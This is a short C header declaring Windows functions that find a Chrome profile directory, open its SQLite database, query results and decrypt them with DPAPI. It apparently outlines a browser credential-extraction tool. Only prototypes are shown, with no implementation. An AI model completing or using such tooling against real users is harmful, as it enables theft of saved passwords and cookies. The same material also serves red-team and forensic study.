#pragma once
#include <stdio.h>
#include <Shlobj.h>
#include <wchar.h>
#include <shlwapi.h>
#include <sqlite3.h>

DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize);
BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* decrypted_data);
BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_string);
BOOL checkSubtring(const CHAR* substring, PCHAR test_string);
BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, WORD buf_outSize);
BOOL open_database(PSTR chrome_dir_char, PSTR profile_name, void** handle_db, PSTR buf_outMsg, WORD buf_outSize);
BOOL prepare_sql(void* handle_db, void** handle_sql_stmt, const char* sql_stmt, PSTR buf_outMsg, WORD buf_outSize);
BOOL sql_result(sqlite3_stmt* handle_sql_stmt, char* result_1, int result_1_size, char* result_2, int result_2_size, char* result_3, int result_3_size);